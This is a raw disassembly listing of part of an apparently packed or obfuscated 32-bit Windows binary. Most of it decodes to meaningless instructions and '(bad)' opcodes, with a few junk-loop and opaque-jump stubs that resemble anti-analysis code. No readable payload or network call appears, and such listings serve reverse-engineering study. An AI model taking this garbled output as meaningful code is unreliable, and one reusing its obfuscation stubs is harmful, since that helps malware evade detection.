  4081f7:	jbe    0x408271
  4081f9:	and    DWORD PTR [ecx-0x80],ecx
  4081fc:	push   edx
  4081fd:	out    0x7f,al
  4081ff:	ror    BYTE PTR ss:[ecx+0x1aeabc9f],0x1b
  408207:	cmp    DWORD PTR [edx],esp
  408209:	push   esp
  40820a:	fistp  WORD PTR [ebx]
  40820c:	mov    esi,0xa10df7da
  408211:	jecxz  0x4081f8
  408213:	lods   eax,DWORD PTR ds:[esi]
  408214:	push   esp
  408215:	loopne 0x408289
  408217:	adc    cl,BYTE PTR [ecx]
  408219:	aad    0xd1
  40821b:	out    dx,eax
  40821c:	push   ebx
  40821d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40821e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40821f:	aaa    
  408220:	pop    ds
  408221:	sbb    eax,0x1e804e22
  408226:	cmp    eax,DWORD PTR [ebx-0x50]
  408229:	iret   
  40822a:	imul   BYTE PTR [edx-0x22]
  40822d:	out    0x88,al
  40822f:	mov    ecx,0xf2e91447
  408234:	lsl    ebp,WORD PTR [ebx]
  408237:	lock data16 vsubpd ymm6,ymm0,YMMWORD PTR [edi-0x41174da2]
  408241:	dec    esp
  408242:	stos   BYTE PTR es:[edi],al
  408243:	mov    ebp,0xd413763a
  408248:	jmp    0x19b:0xa2e5133
  40824f:	test   eax,0x3bc241da
  408254:	aas    
  408255:	iret   
  408256:	imul   ebp,DWORD PTR ss:0x950ee42b,0xffffffe4
  40825e:	pop    edi
  40825f:	xchg   ebp,eax
  408260:	xchg   ebx,eax
  408261:	fs gs std 
  408264:	inc    esi
  408265:	pop    ebp
  408266:	iret   
  408267:	inc    ebx
  408268:	sub    al,0x3c
  40826a:	push   ebx
  40826b:	cwde   
  40826c:	test   DWORD PTR [edx+0x2b],ecx
  40826f:	xor    al,0xa4
  408271:	jl     0x4082f1
  408273:	mov    ebx,fs
  408275:	and    DWORD PTR [eax],0x19
  408278:	jmp    0x4d02:0xb3f32a1c
  40827f:	cmp    BYTE PTR [edi-0x3ccb85f3],ah
  408285:	mov    edi,0xbf0dc5a8
  40828a:	and    BYTE PTR [esi+esi*1],cl
  40828d:	test   eax,0x5d70a219
  408292:	xchg   ebx,eax
  408293:	sbb    eax,DWORD PTR [ebx-0x59]
  408296:	cdq    
  408297:	ror    DWORD PTR [edx+0x25aa16a3],cl
  40829d:	dec    ecx
  40829e:	jns    0x4082f6
  4082a0:	mov    dh,0x4e
  4082a2:	pop    ebp
  4082a3:	ds fs je 0x408243
  4082a7:	fist   DWORD PTR [edx]
  4082a9:	or     BYTE PTR [edx-0x4a],dh
  4082ac:	leave  
  4082ad:	fst    DWORD PTR [edx+ebx*4+0x33827dfc]
  4082b4:	cli    
  4082b5:	mov    fs,WORD PTR [edi]
  4082b7:	dec    edi
  4082b8:	rol    BYTE PTR gs:[esi],0xd
  4082bc:	push   eax
  4082bd:	sub    al,0x23
  4082bf:	pusha  
  4082c0:	shr    edi,1
  4082c2:	adc    al,0x16
  4082c4:	clc    
  4082c5:	outs   dx,BYTE PTR ds:[esi]
  4082c6:	cmp    ecx,DWORD PTR [edi]
  4082c8:	pop    ds
  4082c9:	sub    eax,0xcadcd84a
  4082ce:	stos   BYTE PTR es:[edi],al
  4082cf:	push   esp
  4082d0:	adc    DWORD PTR [ebp-0x60fbdc5a],0x2200738d
  4082da:	push   eax
  4082db:	fwait
  4082dc:	aaa    
  4082dd:	(bad)  [ebp+edx*1-0x5aa014fe]
  4082e4:	stos   DWORD PTR es:[edi],eax
  4082e5:	mov    bl,0xb4
  4082e7:	xchg   DWORD PTR [esp+esi*1-0x26d5f5e0],edi
  4082ee:	dec    esp
  4082ef:	mov    WORD PTR [edx],ds
  4082f1:	mov    BYTE PTR ds:0x3393b6d0,al
  4082f7:	or     BYTE PTR [eax-0x69],dh
  4082fa:	dec    edx
  4082fb:	bt     ecx,esi
  4082fe:	adc    BYTE PTR ds:0x2d16cdb2,dh
  408304:	out    dx,al
  408305:	jns    0x408377
  408307:	cmp    al,0xe8
  408309:	cmc    
  40830a:	pop    eax
  40830b:	mov    BYTE PTR [edx],bh
  40830d:	cwde   
  40830e:	mov    bh,0xcc
  408310:	mov    BYTE PTR [ebx],ch
  408312:	pop    eax
  408313:	ret    
  408314:	lea    eax,[ebp-0xb]
  408317:	add    ecx,DWORD PTR [edi-0x10]
  40831a:	loop   0x408348
  40831c:	or     dh,0x5
  40831f:	jmp    DWORD PTR [ecx]
  408321:	mov    edi,DWORD PTR [edi]
  408323:	adc    eax,0x755203b6
  408328:	das    
  408329:	cmp    ecx,DWORD PTR [esi-0x11]
  40832c:	ret    0xf879
  40832f:	not    BYTE PTR [edx]
  408331:	imul   esi,ebp,0xffffffe5
  408334:	loope  0x408393
  408336:	or     cl,BYTE PTR [edi-0x7062effc]
  40833c:	add    ch,BYTE PTR [edx]
  40833e:	in     al,0x58
  408340:	and    eax,DWORD PTR [edi]
  408342:	inc    esi
  408343:	push   ebp
  408344:	mov    DWORD PTR [ecx+0x23edea53],esi
  40834a:	xor    eax,0x6743ad3
  40834f:	cmp    al,0x18
  408351:	test   al,0x24
  408353:	pushf  
  408354:	xor    eax,edx
  408356:	cmp    eax,0x69ca0b32
  40835b:	je     0x4072df
  408361:	mov    eax,DWORD PTR [ebp-0x10]
  408364:	add    DWORD PTR [eax],0x7403504
  40836a:	jmp    0x4072df
  40836f:	mov    eax,DWORD PTR [ebp-0x1c]
  408372:	cmp    DWORD PTR [eax],edi
  408374:	je     0x4072df
  40837a:	mov    eax,0x800f1c81
  40837f:	jmp    0x4072e6
  408384:	push   ebp
  408385:	mov    ebp,esp
  408387:	sub    esp,0x60
  40838a:	mov    DWORD PTR ds:0x43466f,0x17
  408394:	cmp    DWORD PTR ds:0x43466f,0x0
  40839b:	je     0x4083fd
  4083a1:	cmp    DWORD PTR ds:0x43466f,0x6
  4083a8:	jne    0x4083c8
  4083ae:	push   0x4346d3
  4083b3:	push   0x4c23
  4083b8:	push   0x3f32
  4083bd:	push   0x4c42
  4083c2:	call   DWORD PTR ds:0x413288
  4083c8:	cmp    DWORD PTR ds:0x43466f,0x7
  4083cf:	jne    0x4083e0
  4083d5:	mov    eax,ds:0x43466f
  4083da:	dec    eax
  4083db:	mov    ds:0x43466f,eax
  4083e0:	mov    eax,ds:0x43466f
  4083e5:	dec    eax
  4083e6:	mov    ds:0x43466f,eax
  4083eb:	jmp    0x408394
  4083f0:	movzx  eax,BYTE PTR ds:0x434793
  4083f7:	sbb    DWORD PTR ds:0x434683,eax
  4083fd:	mov    eax,DWORD PTR [ebp+0x8]
  408400:	sbb    DWORD PTR ds:0x434707,0x4487
  40840a:	push   ebx
  40840b:	xor    ebx,ebx
  40840d:	or     ebx,DWORD PTR ds:0x434703
  408413:	sbb    DWORD PTR ds:0x434793,ebx
  408419:	push   esi
  40841a:	jmp    0x4086a2
  40841f:	jmp    DWORD PTR [ecx]
  408421:	lahf   
  408422:	xchg   esp,eax
  408423:	mov    eax,ds:0xe73db59c
  408428:	sbb    bh,bl
  40842a:	(bad)  
  40842b:	push   cs
  40842c:	jne    0x4083dd
  40842e:	(bad)  
  40842f:	sti    
  408430:	fidivr WORD PTR [esi+0x7e]
  408433:	loope  0x4084ad
  408435:	jle    0x4084b5
  408437:	scas   eax,DWORD PTR es:[edi]
  408438:	bound  ebp,QWORD PTR [ebx-0x1ed319da]
  40843e:	fwait
  40843f:	mov    ah,0x93
  408441:	xlat   BYTE PTR ds:[ebx]
  408442:	std    
  408443:	adc    al,0xb2
  408445:	sbb    eax,0x210299e2
  40844a:	(bad)  
  40844b:	push   esi
  40844c:	mov    eax,ds:0x2c83ebc5
  408451:	push   esp
  408452:	sahf   
  408453:	daa    
  408454:	cmp    edx,esp
  408456:	xlat   BYTE PTR ds:[ebx]
  408457:	lds    edx,FWORD PTR [ecx+0x46]
  40845a:	push   ds
  40845b:	push   cs
  40845c:	imul   ecx,DWORD PTR ds:0x4de5ff10,0xffffffdb
  408463:	fwait
  408464:	stos   BYTE PTR es:[edi],al
  408465:	cld    
  408466:	push   ecx
  408467:	mov    ebx,0x8d1b136e
  40846c:	push   es
  40846d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40846e:	out    dx,eax
  40846f:	dec    esp
  408470:	sbb    eax,0xfbb1f0e2
  408475:	mov    edi,0xe362f367
  40847a:	pop    edx
  40847b:	push   ds
  40847c:	and    ch,al
  40847e:	xchg   edi,eax
  40847f:	dec    esp
  408480:	push   ecx
  408481:	(bad)  
  408482:	inc    edx
  408483:	or     eax,0x9c07cdfa
  408488:	mov    DWORD PTR [ecx+esi*2+0x24],ecx
  40848c:	or     DWORD PTR [esi],ebp
  40848e:	cmp    DWORD PTR [edx+0x57],0xb9b767d0
  408495:	push   es
  408496:	(bad)
  40849a:	mov    DWORD PTR [esi+0x6e52c074],esi
  4084a0:	gs jnp 0x40847e
  4084a3:	adc    eax,0xe241cb12
  4084a8:	or     ecx,DWORD PTR [ebx+ebp*2]
  4084ab:	jo     0x4084a9
  4084ad:	adc    dl,bl
  4084af:	je     0x40846e
  4084b1:	in     eax,dx
  4084b2:	cli    
  4084b3:	sbb    al,0x9f
  4084b5:	push   ss
  4084b6:	loope  0x408463
  4084b8:	fcom   DWORD PTR [edx]
  4084ba:	mov    eax,ds:0x48f5d5ae
  4084bf:	ficom  WORD PTR [edx+0x7580f0c2]
  4084c5:	lods   eax,DWORD PTR ds:[esi]
  4084c6:	jmp    0x408540
  4084c8:	dec    ebx
  4084c9:	outs   dx,DWORD PTR ds:[esi]
  4084ca:	ret    
  4084cb:	les    ebx,FWORD PTR [ebx+0x3769aac1]
  4084d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084d2:	or     eax,0xcfb78d5f
  4084d7:	push   edx
  4084d8:	jbe    0x4084ac
  4084da:	sbb    DWORD PTR [edx],ebx
  4084dc:	cwde   
  4084dd:	add    bh,cl
  4084df:	cmp    edi,DWORD PTR [edx+0x4ad4f409]
  4084e5:	pop    edi
  4084e6:	into   
  4084e7:	jb     0x408558
  4084e9:	jns    0x40853c
  4084eb:	mov    esp,0x58762c08
  4084f0:	mov    eax,0xcf8e8d71
  4084f5:	(bad)  
  4084f6:	adc    DWORD PTR [ebp-0x1aa6b4b4],ebp
  4084fc:	jp     0x40852b
  4084fe:	inc    edx
  4084ff:	cwde   
  408500:	jmp    0x3edd:0xf7ce160b
  408507:	push   esp
  408508:	sahf   
  408509:	out    dx,eax
  40850a:	js     0x4084fa
  40850c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40850d:	or     al,0xfb
  40850f:	jmp    0x408508
  408511:	inc    esi
  408512:	sbb    al,0x52
  408514:	mov    al,ds:0x313be00d
  408519:	mov    ebp,0x70132a25
  40851e:	sub    al,BYTE PTR [ebx]
  408520:	icebp  
  408521:	std    
  408522:	iret   
  408523:	push   ds
  408524:	out    0x41,eax
  408526:	out    0x61,al
  408528:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408529:	fwait
  40852a:	ja     0x40853e
  40852c:	mov    DWORD PTR [eax],edx
  40852e:	sbb    eax,0xe84765c
  408533:	gs sbb esi,ebp
  408536:	in     al,dx
  408537:	sub    eax,0xa3fd1950
  40853c:	dec    edx
  40853d:	shl    BYTE PTR [ebx-0x3efd4d0b],0xa2
  408544:	jg     0x4084ca
  408546:	xor    eax,edi
  408548:	add    DWORD PTR gs:[edx+0x6a],edi
  40854c:	pop    ds
  40854d:	(bad)  
  40854e:	in     eax,dx
  40854f:	stos   BYTE PTR es:[edi],al
  408550:	imul   cl
  408552:	mov    ah,0xe4
  408554:	mov    ah,0x17
  408556:	retf   
  408557:	pop    ss
  408558:	mov    ch,0x44
  40855a:	dec    ebx
  40855b:	(bad)  [eax-0x5ea00db1]
  408561:	xor    BYTE PTR [eax-0x56afaeb5],cl
  408567:	adc    BYTE PTR [ecx+0x43d6c309],ah
  40856d:	jecxz  0x4085e6
  40856f:	outs   dx,BYTE PTR ds:[esi]
  408570:	xlat   BYTE PTR ds:[ebx]
  408571:	js     0x4085de
  408573:	and    ebx,DWORD PTR [edx+0x3b95eac]
  408579:	add    edi,0x23
  40857c:	in     al,0xb1
  40857e:	mov    dh,0xd2
  408580:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408581:	or     al,0x41
  408583:	push   edi
  408584:	fisubr WORD PTR [ecx+eax*8-0xea76bf5]
  40858b:	or     edx,DWORD PTR [ebp+0x4ec90ce7]
  408591:	rcr    dl,1
  408593:	mov    ds:0xc4dd2322,eax
  408598:	sub    dl,BYTE PTR [bp+0x56]
  40859c:	aam    0x19
  40859e:	pop    ebp
  40859f:	push   ebx
  4085a0:	xor    esp,DWORD PTR [edi]
  4085a2:	mov    al,0x3c
  4085a4:	or     DWORD PTR [ebx],edi
  4085a6:	popa   
  4085a7:	nop
  4085a8:	mov    esp,0xb79ffbe9
  4085ad:	pop    ds
  4085ae:	dec    ecx
  4085af:	xlat   BYTE PTR ds:[ebx]
  4085b0:	test   BYTE PTR [edx-0x5d719649],dl
  4085b6:	sti    
  4085b7:	push   edi
  4085b8:	(bad)  
  4085ba:	xchg   esp,eax
  4085bb:	gs addr16 mov edx,0xedbeb6f4
  4085c2:	push   esp
  4085c3:	(bad)  
  4085c4:	pop    ebx
  4085c5:	xor    BYTE PTR [ebp+0x12],dh
  4085c8:	mov    al,0x57
  4085ca:	cwde   
  4085cb:	inc    esi
  4085cc:	pop    edx
  4085cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085ce:	mov    al,0x5
  4085d0:	enter  0xbc29,0x67
  4085d4:	or     DWORD PTR [ecx-0x27527205],esp
  4085da:	adc    esi,DWORD PTR [edx-0x59]
  4085dd:	popf   
  4085de:	(bad)  
  4085df:	into   
  4085e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085e1:	lds    esi,FWORD PTR [ebx-0x1]
  4085e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085e5:	loope  0x40861c
  4085e7:	(bad)  
  4085e8:	push   cs
  4085e9:	pop    esi
  4085ea:	dec    ebx
  4085eb:	jp     0x408620
  4085ed:	mov    ecx,0xa501042a
  4085f2:	pop    esi
  4085f3:	sbb    DWORD PTR [edi],ecx
  4085f5:	mov    esp,0x2f786d01
  4085fa:	mov    edi,0x6f0538b4
  4085ff:	sub    eax,0x15d11fe8
  408604:	add    BYTE PTR [edx+0x4735df1d],0x2a
  40860b:	js     0x408649
  40860d:	adc    esp,edx
  40860f:	sbb    eax,0x2ae8582b
  408614:	jl     0x408658
  408616:	push   ds
  408617:	or     dh,0xed
  40861a:	adc    BYTE PTR [eax+0x5d499a72],bh
  408620:	pop    ebx
  408621:	add    al,0x85
  408623:	push   ebp
  408624:	jl     0x4085ec
  408626:	(bad)  
  408627:	cld    
  408628:	out    0xe7,eax
  40862a:	or     bl,al
  40862c:	dec    esp
  40862d:	in     al,dx
  40862e:	xchg   ebp,eax
  40862f:	retf   0x12d2
  408632:	gs pusha 
  408634:	test   ebx,edi
  408636:	test   BYTE PTR [eax],ch
  408638:	and    BYTE PTR [edi-0x49e7daf9],ah
  40863e:	inc    esp
  40863f:	out    dx,al
  408640:	(bad)
  408643:	loop   0x408689
  408645:	push   edi
  408646:	pop    ebx
  408647:	mov    esi,DWORD PTR ds:0x52ffb6c7
  40864d:	jne    0x408617
  40864f:	adc    bl,BYTE PTR [ebx+0x214d286c]
  408655:	dec    ebp
  408656:	jne    0x4086c1
  408658:	inc    eax
  408659:	add    al,BYTE PTR [esi+0x5b1427b6]
  40865f:	jle    0x4086e0
  408661:	jmp    0xcc4b:0xe34b749b
  408668:	sbb    BYTE PTR [ebx+ebp*2-0x6d],ah
  40866c:	ficom  WORD PTR [eax-0xf]
  40866f:	ror    BYTE PTR [eax-0x5c],cl
  408672:	pop    eax
  408673:	ss clc 
  408675:	shl    BYTE PTR [esi],0x8c
  408678:	xor    al,0x7
  40867a:	xchg   ecx,eax
  40867b:	sbb    al,0x25
  40867d:	clc    
  40867e:	adc    DWORD PTR [eax+0x5dc72430],ebx
  408684:	fild   QWORD PTR [edi+ecx*1-0x71]
  408688:	lods   eax,DWORD PTR ds:[esi]
  408689:	scas   eax,DWORD PTR es:[edi]
  40868a:	pop    esi
  40868b:	lods   al,BYTE PTR ds:[esi]
  40868c:	adc    BYTE PTR [esi+ebx*2-0x3e],dh
  408690:	xor    dh,ah
  408692:	inc    eax
  408693:	adc    al,0x12
  408695:	adc    DWORD PTR [esp+esi*2+0x4f],ebp
  408699:	repnz lds eax,FWORD PTR [ecx]
  40869c:	shr    BYTE PTR [ecx-0x23],1
  40869f:	pop    ecx
  4086a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086a1:	jmp    0x5148d864
  4086a6:	pop    es
  4086a7:	and    DWORD PTR ds:0x43466f,0x0
  4086b1:	mov    ebx,DWORD PTR ds:0x43466f
  4086b7:	inc    ebx
  4086b8:	mov    DWORD PTR ds:0x43466f,ebx
  4086be:	cmp    DWORD PTR ds:0x43466f,0x8
  4086c5:	jne    0x4086d6
  4086cb:	push   0x2214
  4086d0:	call   DWORD PTR ds:0x41328c
  4086d6:	cmp    DWORD PTR ds:0x43466f,0x7
  4086dd:	jne    0x4086f2
  4086e3:	xor    ebx,ebx
  4086e5:	or     ebx,DWORD PTR ds:0x43466f
  4086eb:	inc    ebx
  4086ec:	mov    DWORD PTR ds:0x43466f,ebx
  4086f2:	cmp    DWORD PTR ds:0x43466f,0x11
  4086f9:	jb     0x4086b1
  4086ff:	xor    eax,esi
  408701:	or     ebx,0x4275
  408707:	mov    ebx,0x327299
  40870c:	add    eax,ebx
  40870e:	push   edi
  40870f:	sub    edi,DWORD PTR ds:0x434703
  408715:	mov    DWORD PTR [ebp-0x18],eax
  408718:	xor    edi,0x561f
  40871e:	jmp    0x4089a6
  408723:	push   esi
  408724:	ja     0x40875d
  408726:	push   ecx
  408727:	aaa    
  408728:	push   ecx
  408729:	jo     0x40879c
  40872b:	(bad)  
  40872c:	mov    eax,0x932a3fc8
  408731:	(bad)  
  408732:	enter  0xd86e,0x7e
  408736:	jle    0x408719
  408738:	js     0x4087b8
  40873a:	jle    0x40878e
  40873c:	into   
  40873d:	mov    WORD PTR [ecx+0x6b],?
  408740:	popa   
  408741:	repnz gs inc ecx
  408744:	pop    edi
  408745:	nop
  408746:	loope  0x40877e
  408748:	pop    edi
  408749:	or     edx,DWORD PTR [edi-0x7ecfb2ba]
  40874f:	cmp    al,0x97
  408751:	stc    
  408752:	or     BYTE PTR [edi+ebp*1-0x208faccb],al
  408759:	dec    eax
  40875a:	and    DWORD PTR [ebx-0x48],ebp
  40875d:	(bad)  
  40875e:	leave  
  40875f:	mov    ebx,0x41a6b615
  408764:	adc    DWORD PTR [ebp-0x151c05d1],esp
  40876a:	scas   eax,DWORD PTR es:[edi]
  40876b:	addr16 call 0x14a2368c
  408771:	leave  
  408772:	push   ebx
  408773:	mov    DWORD PTR [edi+ebx*4],esp
  408776:	sub    DWORD PTR [ecx+edi*4+0x69],ecx
  40877a:	xchg   BYTE PTR [ebx-0x16],bh
  40877d:	jmp    0xcff3:0xa38f7e9
  408784:	fmul   QWORD PTR [esi-0x74]
  408787:	mov    dl,0x5
  408789:	dec    eax
  40878a:	shr    DWORD PTR [ebp+0x3d3b7991],0x9a
  408791:	jbe    0x4087d1
  408793:	fst    DWORD PTR [eax]
  408795:	addr16 dec esi
  408797:	stos   BYTE PTR es:[edi],al
  408798:	hlt    
  408799:	jecxz  0x4087af
  40879b:	int3   
  40879c:	dec    ebp
  40879d:	add    al,BYTE PTR [eax]
  40879f:	sbb    BYTE PTR [ebp+0xe],ch
  4087a2:	retf   0x88b1
  4087a5:	call   FWORD PTR [eax]
  4087a7:	mov    ch,0x37
  4087a9:	and    ecx,DWORD PTR [ecx]
  4087ab:	outs   dx,BYTE PTR ds:[esi]
  4087ac:	cdq    
  4087ad:	leave  
  4087ae:	retf   0x881c
  4087b1:	sbb    DWORD PTR [edi],edx
  4087b3:	jns    0x40876f
  4087b5:	mov    al,ds:0x653c3cc5
  4087ba:	(bad)  
  4087bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087bc:	cmc    
  4087bd:	or     ecx,DWORD PTR [edi]
  4087bf:	cli    
  4087c0:	int3   
  4087c1:	gs adc eax,eax
  4087c4:	inc    edi
  4087c5:	jne    0x4087f4
  4087c7:	shl    DWORD PTR [esi-0x32],0x2b
  4087cb:	mov    esi,0xc6e659ec
  4087d0:	jmp    0x6149:0x57174733
  4087d7:	jmp    0x4087d4
  4087d9:	adc    DWORD PTR ds:0xd882c7cd,ebp
  4087df:	pop    ebp
  4087e0:	push   0xffffffb7
  4087e2:	sub    DWORD PTR [ecx+0x68],esi
  4087e5:	dec    ecx
  4087e6:	xchg   ebp,eax
  4087e7:	call   0xb7766975
  4087ec:	pop    ebx
  4087ed:	test   eax,0x71143cd1
  4087f2:	mov    cl,0x3b
  4087f4:	js     0x4087e8
  4087f6:	leave  
  4087f7:	push   ebp
  4087f8:	jl     0x4087e0
  4087fa:	gs fs jp 0x4087ea
  4087fe:	jno    0x408784
  408800:	push   ds
  408801:	pop    ebp
  408802:	fsubr  DWORD PTR [ebx+0x18eebb92]
  408808:	jbe    0x4087ca
  40880a:	push   ds
  40880b:	jmp    0x408851
  40880d:	popf   
  40880e:	jecxz  0x408828
  408810:	mov    ax,WORD PTR ds:0xfb8cff40
  408817:	retf   0x2fbd
  40881a:	sti    
  40881b:	fstp   QWORD PTR [ebx]
  40881d:	idiv   dh
  40881f:	in     al,dx
  408820:	test   BYTE PTR [ecx-0x7b842669],bh
  408826:	aaa    
  408827:	lock aad 0x4
  40882a:	loope  0x40888d
  40882c:	xchg   edx,eax
  40882d:	and    al,0xb2
  40882f:	fistp  DWORD PTR [esi+0x62]
  408832:	jns    0x4087ce
  408834:	sbb    DWORD PTR [ebx-0x178b3dfd],ebp
  40883a:	test   eax,0x7f0e976
  40883f:	test   al,0x9b
  408841:	es cmp ecx,ebp
  408844:	aam    0xa0
  408846:	inc    edx
  408847:	add    eax,0x4b0fc9f
  40884c:	or     eax,0x55ac0bb4
  408851:	dec    DWORD PTR [ebp+0x69730cf6]
  408857:	sti    
  408858:	mov    edi,0xc70904d4
  40885d:	xchg   edx,eax
  40885e:	jmp    0x408891
  408860:	and    esi,esp
  408862:	mov    ds:0x8024098b,eax
  408867:	sbb    BYTE PTR [edx+0x61ebfe85],dh
  40886d:	add    dl,BYTE PTR [eax+0x5]
  408870:	cwde   
  408871:	add    dh,BYTE PTR [esi+ecx*2-0x16]
  408875:	xor    ebp,DWORD PTR [edi+eiz*2-0x73c4719a]
  40887c:	outs   dx,DWORD PTR ds:[esi]
  40887d:	lahf   
  40887e:	lahf   
  40887f:	add    DWORD PTR [ebx-0x29],edi
  408882:	je     0x40882e
  408884:	push   0x8518764f
  408889:	in     al,dx
  40888a:	mov    eax,0xdb182cd6
  40888f:	retf   
  408890:	in     al,0xe9
  408892:	adc    BYTE PTR [ebp+0x7a],cl
  408895:	add    DWORD PTR [ebp+edx*2-0x47],edi
  408899:	xchg   DWORD PTR [ecx],ebp
  40889b:	cli    
  40889c:	xor    BYTE PTR [edi],0xa8
  40889f:	aaa    
  4088a0:	test   BYTE PTR [esi+edi*8-0x7],dl
  4088a4:	inc    ebx
  4088a5:	adc    DWORD PTR ds:0xb8a8aedd,esi
  4088ab:	mov    ebp,edi
  4088ad:	jbe    0x4088d2
  4088af:	pop    ss
  4088b0:	add    al,dh
  4088b2:	stc    
  4088b3:	call   0xf3d661ae
  4088b8:	pusha  
  4088b9:	ins    DWORD PTR es:[edi],dx
  4088ba:	add    BYTE PTR [ebx],0x14
  4088bd:	idiv   BYTE PTR [edi]
  4088bf:	in     al,0x87
  4088c1:	sub    esp,DWORD PTR [edi+0x51f1c3d0]
  4088c7:	jns    0x4088c8
  4088c9:	xor    BYTE PTR [edx-0x52],ah
  4088cc:	out    0x6,eax
  4088ce:	int    0x58
  4088d0:	mov    esi,0x74556e9e
  4088d5:	imul   ebp,ebx,0x4c
  4088d8:	hlt    
  4088d9:	mov    ch,0xa4
  4088db:	xor    DWORD PTR [eax-0x24187471],ecx
  4088e1:	mov    ebx,0x955e214e
  4088e6:	inc    eax
  4088e7:	ret    
  4088e8:	ss inc ebx
  4088ea:	xor    eax,ebx
  4088ec:	push   esp
  4088ed:	pop    bx
  4088ef:	call   0xfaaf:0x2b76d685
  4088f6:	jbe    0x408950
  4088f8:	(bad)  
  4088f9:	idiv   DWORD PTR [ebp+eax*2-0x1ec6a657]
  408900:	cwde   
  408901:	popf   
  408902:	dec    esi
  408903:	lods   eax,DWORD PTR ds:[esi]
  408904:	imul   ebx,DWORD PTR [edx+0x3c],0x9f2da80c
  40890b:	imul   ebx,ecx,0xd19e97c6
  408911:	pop    esi
  408912:	cdq    
  408913:	add    al,BYTE PTR [edi-0x72]
  408916:	jo     0x4088a2
  408918:	cdq    
  408919:	and    DWORD PTR [ecx+0x4592805f],ebp
  40891f:	push   ebp
  408920:	stos   DWORD PTR es:[edi],eax
  408921:	neg    DWORD PTR [eax+ebp*1]
  408924:	not    BYTE PTR [eax+ecx*8+0x4d]
  408928:	or     eax,0xdd74c1a6
  40892d:	sahf   
  40892e:	arpl   WORD PTR [ecx-0x57],dx
  408931:	add    eax,0x871caa2d
  408936:	je     0x408958
  408938:	mov    BYTE PTR fs:[esi-0x1a3a6e6a],bl
  40893f:	jmp    0x408964
  408941:	imul   eax,DWORD PTR [ebx-0x20d2a1ad],0x19
  408948:	xchg   esi,eax
  408949:	or     al,BYTE PTR [ebx-0x370f85eb]
  40894f:	mov    edx,0x2fe8b498
  408954:	mov    edi,DWORD PTR [edi+ebx*1-0x76]
  408958:	inc    eax
  408959:	xchg   ecx,eax
  40895a:	ret    
  40895b:	dec    esp
  40895c:	and    al,0xf9
  40895e:	lea    edx,[eax]
  408960:	and    al,0x13
  408962:	aam    0xcf
  408964:	sub    al,0x9a
  408966:	sub    esp,DWORD PTR [eax+eax*2]
  408969:	mov    al,0xfa
  40896b:	rcl    DWORD PTR [edx],0xac
  40896e:	int3   
  40896f:	loope  0x408900
  408971:	cdq    
  408972:	or     al,0x9c
  408974:	lahf   
  408975:	out    0x1c,al
  408977:	mov    ah,0xaf
  408979:	call   0xf7bb:0x7b3ca730
  408980:	pop    ss
  408981:	jb     0x408968
  408983:	repnz xchg esp,eax
  408985:	inc    edi
  408986:	scas   al,BYTE PTR es:[edi]
  408987:	pop    ebx
  408988:	js     0x408928
  40898a:	mov    WORD PTR [ecx],ds
  40898c:	add    al,0x6c
  40898e:	adc    eax,0x151e170b
  408993:	jbe    0x4089eb
  408995:	dec    ebx
  408996:	pop    esp
  408997:	ins    DWORD PTR es:[edi],dx
  408998:	mov    ds:0x3ea861ef,eax
  40899d:	push   esi
  40899e:	or     bl,BYTE PTR ds:0x1155a944
  4089a4:	sbb    eax,0x87d8b41
  4089a9:	xor    edi,esi
  4089ab:	not    DWORD PTR ds:0x43466b
  4089b1:	mov    DWORD PTR [ebp-0xc],0xf89c85f6
  4089b8:	mov    DWORD PTR [ebp-0x10],0xf89c8736
  4089bf:	add    edi,ebx
  4089c1:	jmp    0x4092cd
  4089c6:	cmp    edi,0x3f
  4089c9:	jmp    0x408c51
  4089ce:	adc    dl,BYTE PTR [ebx-0x524adccb]
  4089d4:	sbb    al,0xb3
  4089d6:	xchg   ebx,eax
  4089d7:	pop    ds
  4089d8:	adc    cl,cl
  4089da:	push   eax
  4089db:	mov    DWORD PTR [eax+0x7edbd1e6],0x7e78e17e
  4089e5:	jle    0x408979
  4089e7:	in     eax,0xe2
  4089e9:	inc    ebp
  4089ea:	repnz push 0x3b84b7a7
  4089f0:	pop    es
  4089f1:	cwde   
  4089f2:	xlat   BYTE PTR ds:[ebx]
  4089f3:	mov    eax,ds:0xf13b8a69
  4089f8:	add    ah,BYTE PTR [edi-0x28]
  4089fb:	and    BYTE PTR [eax],dh
  4089fd:	test   bh,cl
  4089ff:	push   0x542716fa
  408a04:	sbb    eax,0xfe524ba1
  408a09:	lea    edx,[ecx+ecx*4]
  408a0c:	add    ch,BYTE PTR [ecx+0x69]
  408a0f:	gs cmp al,0xb0
  408a12:	ret    0xadba
  408a15:	jl     0x408a84
  408a17:	daa    
  408a18:	cs mov ebx,0xfd5c543a
  408a1e:	dec    eax
  408a1f:	aad    0x1d
  408a21:	xchg   DWORD PTR [esi],edx
  408a23:	iret   
  408a24:	clc    
  408a25:	add    DWORD PTR [ebx-0x7f],0x684afeb3
  408a2c:	or     eax,0x79c37bb5
  408a31:	or     edi,edx
  408a33:	iret   
  408a34:	(bad)  
  408a35:	in     eax,0xd8
  408a37:	cmp    ch,BYTE PTR [ebx-0x26059c8e]
  408a3d:	sbb    dl,BYTE PTR [ecx]
  408a3f:	pop    eax
  408a40:	dec    edx
  408a41:	mov    eax,ds:0xc8c4c050
  408a46:	in     eax,dx
  408a47:	xor    eax,DWORD PTR [edi]
  408a49:	cmp    BYTE PTR [ecx*2-0x2bf92422],al
  408a50:	cmp    DWORD PTR [eax+0x59233adf],0x633aba55
  408a5a:	dec    ebx
  408a5b:	add    al,bl
  408a5d:	adc    BYTE PTR [esi+0x56fcb967],cl
  408a63:	imul   ecx,DWORD PTR [esi+0x36],0xf462d56f
  408a6a:	inc    esi
  408a6b:	cld    
  408a6c:	mov    bl,BYTE PTR [ebx]
  408a6e:	out    0x80,eax
  408a70:	and    eax,0x19177668
  408a75:	pop    ss
  408a76:	retf   0x671d
  408a79:	repnz cli 
